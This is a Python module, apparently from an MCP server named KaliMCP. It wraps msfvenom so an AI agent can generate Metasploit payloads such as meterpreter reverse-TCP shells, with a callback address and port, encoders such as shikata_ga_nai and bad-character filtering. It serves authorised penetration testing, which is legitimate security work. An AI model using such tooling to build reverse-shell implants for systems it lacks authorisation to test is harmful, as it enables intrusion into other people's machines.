# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""msfvenom wrapper — payload generation only (no Metasploit framework).

msfvenom is Metasploit's shellcode / staged-payload generator. It
emits raw bytes (or a packaged executable / script) suitable for
upload to a compromised host. KaliMCP does NOT expose msfconsole or
any module that would deliver / execute a payload; only the
generator.

Payloads can be large + dual-use, so the MCP result returns a
filesystem path + sha256 + format, never the raw bytes. The path is
``~/.kalimcp/payloads/<sha256>.<ext>``; operators retrieve the
binary off the box themselves.
"""

from __future__ import annotations

import hashlib
import os
from pathlib import Path
from typing import Any

from .. import run
from ._active import active_tool


def _payload_dir() -> Path:
    p = Path.home() / ".kalimcp" / "payloads"
    p.mkdir(parents=True, exist_ok=True)
    return p


def _ext_for_format(fmt: str) -> str:
    f = fmt.lower()
    mapping = {
        "exe": "exe",
        "exe-only": "exe",
        "dll": "dll",
        "psh": "ps1",
        "powershell": "ps1",
        "vba": "vba",
        "elf": "elf",
        "macho": "macho",
        "raw": "bin",
        "asp": "asp",
        "aspx": "aspx",
        "war": "war",
        "python": "py",
        "ruby": "rb",
        "c": "c",
    }
    return mapping.get(f, "bin")


@active_tool(tool_name="msfvenom")
async def generate(
    *,
    target: str,
    payload: str,
    lhost: str,
    lport: int = 4444,
    format: str = "exe",
    encoder: str = "",
    iterations: int = 1,
    badchars: str = "",
    timeout_seconds: int = 120,
) -> dict[str, Any]:
    """Generate a payload with msfvenom.

    Args:
      target: free-form descriptor logged in the audit trail
        (e.g. ``"win10-corp-laptop"``); doesn't reach msfvenom.
      payload: msfvenom payload spec (e.g.
        ``windows/x64/meterpreter/reverse_tcp``).
      lhost: callback IP.
      lport: callback port (default 4444).
      format: output format (``exe``, ``dll``, ``psh``, ``raw``,
        ``aspx``, ``war``, ``python``, …). Default ``exe``.
      encoder: msfvenom encoder spec (e.g. ``x86/shikata_ga_nai``).
        Empty disables encoding.
      iterations: encoder pass count (default 1; ignored if no
        encoder).
      badchars: characters to avoid in the payload (e.g.
        ``"\\x00\\x0a\\x0d"``).
      timeout_seconds: hard wallclock cap (default 120).

    Returns ``parsed``: ``{path, sha256, size_bytes, format,
    payload, lhost, lport}``. Raw bytes are NEVER returned in the
    MCP result.
    """
    payload_dir = _payload_dir()
    # Output to a temp filename; we rename to the sha256 after.
    tmp_path = payload_dir / f".tmp.{os.getpid()}.{_ext_for_format(format)}"

    argv: list[str] = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={int(lport)}",
        "-f", format,
        "-o", str(tmp_path),
    ]
    if encoder:
        argv.extend(["-e", encoder, "-i", str(max(1, int(iterations)))])
    if badchars:
        argv.extend(["-b", badchars])

    result = await run.run(argv, timeout=timeout_seconds)

    parsed: dict[str, Any] = {
        "path": "",
        "sha256": "",
        "size_bytes": 0,
        "format": format,
        "payload": payload,
        "lhost": lhost,
        "lport": int(lport),
    }
    if tmp_path.exists():
        data = tmp_path.read_bytes()
        digest = hashlib.sha256(data).hexdigest()
        final_path = payload_dir / f"{digest}.{_ext_for_format(format)}"
        if final_path != tmp_path:
            try:
                tmp_path.rename(final_path)
            except OSError:
                # Cross-device or already-exists: leave the temp file.
                final_path = tmp_path
        parsed["path"] = str(final_path)
        parsed["sha256"] = digest
        parsed["size_bytes"] = len(data)
    result["parsed"] = parsed
    # stdout from msfvenom is mostly progress noise; replace with a
    # human-readable summary so the agent's MCP result is small.
    if parsed["path"]:
        result["stdout"] = (
            f"payload generated: {parsed['path']} "
            f"({parsed['size_bytes']} bytes, sha256:{parsed['sha256'][:16]}…)"
        )
    return result
